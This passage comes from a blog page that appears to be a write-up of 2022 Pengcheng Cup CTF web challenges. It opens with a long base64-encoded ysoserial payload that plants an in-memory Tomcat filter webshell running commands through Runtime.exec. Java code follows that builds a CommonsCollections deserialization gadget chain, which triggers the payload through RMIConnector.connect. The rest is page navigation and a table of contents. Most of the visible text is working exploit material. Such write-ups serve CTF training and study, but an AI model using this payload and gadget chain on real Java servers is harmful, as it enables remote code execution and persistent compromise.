mRhcmRDb250ZXh0DAKQAjYBAA1qYXZhL3V0aWwvTWFwAQA7eXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Ub21jYXRGaWx0ZXJNZW1TaGVsbEZyb21UaHJlYWQBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZgwCkQKSDAKTAlIMApQCIQwClQJSDAKWApcBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcAwCmAJSBwKZDAKaApsMAUcCIQwCnAJSDAKdAp4BADBvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWcBABtvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQMAp8CoAcCoQwCNwKiAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAmb3JnL2FwYWNoZS90b21jYXQvdXRpbC9odHRwL1BhcmFtZXRlcnMBABJqYXZhL3V0aWwvSXRlcmF0b3IBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQATamF2YXgvY3J5cHRvL0NpcGhlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBAAtnZXRJbnN0YW5jZQEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAhnZXRCeXRlcwEABCgpW0IBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1nZXRQYXJhbWV0ZXJzAQAqKClMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9odHRwL1BhcmFtZXRlcnM7AQAIZW50cnlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwEADWphdmEvdXRpbC9TZXQBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQAHaGFzTmV4dAEABmdldEtleQEACnJlcGxhY2VBbGwBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGdldFZhbHVlAQAEc2l6ZQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEACHB1dFZhbHVlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAAdkb0ZpbmFsAQAGKFtCKVtCAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEADGdldFBhcmFtZXRlcgEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQALdG9CeXRlQXJyYXkBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAIbmFub1RpbWUBAAMoKUoBABwoSilMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAMZ2V0UmVzb3VyY2VzAQAnKClMb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3Q7AQAjb3JnL2FwYWNoZS9jYXRhbGluYS9XZWJSZXNvdXJjZVJvb3QBAApnZXRDb250ZXh0AQAfKClMb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0OwEADWdldFN1cGVyY2xhc3MBAAlzZXRGaWx0ZXIBABkoTGphdmF4L3NlcnZsZXQvRmlsdGVyOylWAQANc2V0RmlsdGVyTmFtZQEAB2dldE5hbWUBAA5zZXRGaWx0ZXJDbGFzcwEADGFkZEZpbHRlckRlZgEANChMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWY7KVYBAA1hZGRVUkxQYXR0ZXJuAQAcamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZQEAB1JFUVVFU1QBAB5MamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZTsBAA1zZXREaXNwYXRjaGVyAQASYWRkRmlsdGVyTWFwQmVmb3JlAQA0KExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcDspVgEAFmdldERlY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&quot;</span>;</span><br><span class="line">        RMIConnector rmiConnector=<span class="keyword">new</span> <span class="title class_">RMIConnector</span>(<span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://localhost:9999/stub/&quot;</span>+exp),map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;connect&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = rmiConnector;</span><br><span class="line">        queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        oser.writeObject(queue);</span><br><span class="line">        oser.close();</span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(ser.toByteArray()));</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(Base64.getEncoder().encodeToString(ser.toByteArray())))).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://lhhxs.github.io">Arcticsea</a>
+            <p>原文链接：<a href="https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/">https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/</a>
+            <p>发表日期：<a href="https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/">September 10th 2022, 12:28:27 am</a>
+            <p>更新日期：<a href="https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/">September 10th 2022, 12:37:00 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/09/10/writeup/2021%20CISCN%20%E5%86%B3%E8%B5%9B%E6%9D%82%E8%AE%B0/" title="2021 CISCN 决赛杂记">
+                    <div class="nextTitle">2021 CISCN 决赛杂记</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/09/09/WEB/%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="前台反序列化代码审计">
+                    <div class="prevTitle">前台反序列化代码审计</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:lhhxs@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/lhhxs" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BY-%E6%81%92%E6%98%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4"><span class="toc-number">1.</span> <span class="toc-text">BY 恒星实验室</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E6%89%8B%E9%AB%98%E6%89%8B%E9%AB%98%E9%AB%98%E6%89%8B-yu22x"><span class="toc-number">1.1.</span> <span class="toc-text">高手高手高高手 (yu22x)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easygo-airrudder"><span class="toc-number">1.2.</span> <span class="toc-text">easygo (airrudder)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB-yu22x"><span class="toc-number">1.3.</span> <span class="toc-text">简单包含 (yu22x)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#can-u-login-airrudder"><span 